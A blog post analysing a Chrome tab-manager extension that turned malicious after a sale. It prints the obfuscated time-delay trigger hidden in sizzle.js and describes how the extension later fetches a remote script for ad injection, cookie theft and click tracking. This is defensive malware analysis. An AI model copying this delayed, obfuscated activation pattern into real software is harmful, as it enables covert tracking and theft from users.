---
title: "How a chrome extension turned to the Dark Side"
date: 2018-05-14
tags: ["chrome", "extension", "browser", "malicious extension"]
draft: false
---
*This is a short story and malware analysis of a chrome extension that served people well then the developer sell it to the malicious advertisement company.*
### Discovery
As you may know, recently I have published an extension (yes! one more tab manager for the world) [SplitUp! - Tab Manager](https://chrome.google.com/webstore/detail/splitup-tab-manager/bhoodecbejheonelhikcfahgpgahffmf). I was looking for a way to improve it and Chrome Web Store is a great place to see other extensions to get inspired for new ideas. I searched "tab manager" to get a general list, then I saw this extension with 50K+ users, well the name of the extension wasn't so hard to guess "Tab Manager" 🤔 but I guess this is what people search.
![Tab Manager extension screenshot on web store](/images/screenshot.png)
### Bad smell
I checked screenshots and decided read reviews to see what people say about it. Well, they were not great. Apparently, from the latest update, the extension showed some malicious behavior such as injecting ads into users' search result without users' contest.  It seemed like many people have already reported the extension but no action has been taken until recently it has been removed. It says usually it takes 2-3 weeks for the extension to be removed from the store. The good news is that after Google flags an extension as a malware, the extension automatically being removed from the current users' browsers. Before it got deleted, I managed to do some analyzes on it and try to see what exactly this extension tries to achieve and how. Since I wasn't really sure what exactly other than ads injection this extension capable of. I decided to utilize my virtual machine for this and install it there.
![Review about Tab Manager on web store](/images/review1.png)
![Review about Tab Manager on web store](/images/review2.png)
### Deep down to the code
First of all, the extension doesn't act maliciously for a while. Once you install it, it stores the current date in the local storage, here the piece of code that was taken from the source
```
chrome.runtime.onInstalled.addListener(function() {
  chrome.storage.local.set({
    time: new Date().getTime()
  });
});
```
This was interesting, at the beginning I didn't quite get why this weird date saves to the storage and no ads showing in my search result as reported by users and the extension made no network activity. The extension also blocked [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) and [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) which could mean the extension uses some kind of Command and Control technique to get instruction or get some kind of javascript file from an external source. I decided to dig in a bit more which led me to think that there must some code checking for time or something. 
#### It is there
"Tab Manager" uses React to render UI and Sizzle CSS Selector. After Searching the files for a while for the suspicious behavior I came across abnormal local storage check in sizzle.js :
```
chrome.storage.local.get('time', function (res) {
      if (res.time) {
        var time = (new Date().getTime() - res.time) / 3600000;
        if (time >= 8) {
          slzzle[1][
            (function (nextNode) {
              var attrNames = nextNode[0].attr[index];
              return attrNames.replace(/\>/g, '|').split('|')[1];
            })(slzzle)
          ][
            []
              .concat(appendTypes)
              .concat(nodeType[0].replace('c', nodeType[index][0].toUpperCase()))
              .join('')
          ](element);

          // remove after created for pseudo elements
          element[nodeType[1]].removeChild(slzzle[index].tag);
        }
      }
    });
  })(xpathcurcssesace(document));
```
Boom! this is it! As you see the code checks if a user has been using the extension for a while since I was a new user it behaved as expected. I brought forward my machine's time to a year early and gave a try to extension again.
### Request to the dark side
As expected, the extension started to make an HTTP request to an external source and downloaded a 665KB javascript file which instructs the extension to inject ads, steal and set cookies and so on.
![malicious http request by the extension](/images/httprequest.png)
It is 10913 lines code inside the file and I am not going to into details, a few interesting points are a huge amount of HTTP request and new javascript files are being downloaded based on the website user visits. They made sure that sure will have a native ads experience on every page, hence in every website a new instruction is being downloaded. Every click is recorded in cookies and also send to remote URL. The huge number of websites are covered, from Russian email services mail.ru, yandex.ru to almost all social networks, search engines etc.
![url check for facebook](/images/fb.png)  

In case a user is on the bitconnect registration form it injects ads to the form 
![registration form](/images/registration.png)  

It seems like some domains are ignored such as paypal, google drive and .gov domains. 
![ignored domains](/images/ignoredDomains.png)
## Conclusion
Unfortunately, these days some developers sell their extension after it gains popularity. This is a huge risk since already downloaded extension will get updated with malicious code without user's contest. It has been showing that Chrome Web Store automatic code check is not perfect for detecting this kind of malicious behaviors. The best solution seems to be conscious and use extensions that are come from a reliable source or open-source. Although, this extension was an open-source project and it still managed to inject people's browser activities.


